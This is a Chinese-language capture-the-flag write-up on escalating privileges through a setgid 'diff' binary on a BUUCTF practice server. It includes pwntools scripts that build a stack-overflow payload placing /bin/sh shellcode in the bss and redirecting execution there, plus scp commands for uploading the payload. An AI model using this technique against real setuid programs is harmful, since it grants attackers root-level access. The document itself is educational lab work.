# Diff

第一次做提权类的题目。。还有些小激动呢

![VPGLch](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/VPGLch.png)

![ntok5q](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/ntok5q.png)

拷贝到本地

`$ scp -r -P 29523 ctf@node3.buuoj.cn:/home/ctf/diff diff`

这个程序好简洁，似乎是汇编写的？没有libc库

![jy08em](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/jy08em.png)

![iz284q](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/iz284q.png)

有一个栈溢出，可以直接控制EIP。

![Os1cZQ](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Os1cZQ.png)

通过让diff读取我们的文件，然后会产生一个栈溢出。

![HBRpRy](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/HBRpRy.png)

提权的套路就是，通过让diff这个权限更高的程序，来反弹一个shell。这样就能读flag了。（注意服务器上diff的组权限有个s，也就是diff在执行某些程序时拥有root权限）

生成leak文件的Demo，通过./diff  flag leak运行会发生崩溃。

```python
#!/usr/bin/python
from pwn import *

#payload=cyclic(0x200)
#print cyclic_find("0x62616167")

###rop_gadgets###
add_eax=0x08049117 # add eax,1#leave#ret

EBP=0xffffd034
payload='A'*120
payload+=p32(EBP)
payload+=p32(0x41414141)+p32(add_eax)#+p32(eax)
file=open('leak',"w")
file.write(payload)


#./diff flag leak
'''
sys_write 
eax=0x4
ebx=1. ;fd
ecx= 0x3 ;flag
edx =len
'''
```

利用diff来提权。

程序没有加载链接库。一开始想用ROP，但是发现没有什么合适的gadget，无法getshell。所以考虑过，使用diff 将flag读入内存，然后想办法用sys_write出来。

![6cIgsW](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/6cIgsW.png)

![IXfvFZ](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/IXfvFZ.png)

```
sys_write 
eax=0x4
ebx=1. ;fd
ecx= 0x3 ;flag 文件句柄
edx =len
```

一开始以为一直是构造ROP，结果发现bss可写。。。直接把shellcode写到bss就行了。

```python
#!/usr/bin/python
from pwn import *

#payload=cyclic(0x200)
#print cyclic_find("0x62616167")

###rop_gadgets###
add_eax=0x08049117 # add eax,1#leave#ret
context(arch='x86', os='linux')



EBP=0xffffd034
#payload='A'*116
payload=asm(shellcraft.sh()).ljust(116,'\x90')
payload+=p32(0x51515151)
payload+=p32(EBP)
payload+=p32(0x804a024)#+p32(add_eax)#+p32(eax)
file=open('leak',"w")
file.write(payload)


#./diff flag leak
'''
sys_write 
eax=0x4
ebx=1. ;fd
ecx= 0x3 ;flag
edx =len
'''
```

生成了提权文件

***scp -r -P29533 leak ctf@node3.buuoj.cn:/tmp/leak***

上传到服务器/tmp目录下，然后就可以提权成功

![O1Q2ao](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/O1Q2ao.png)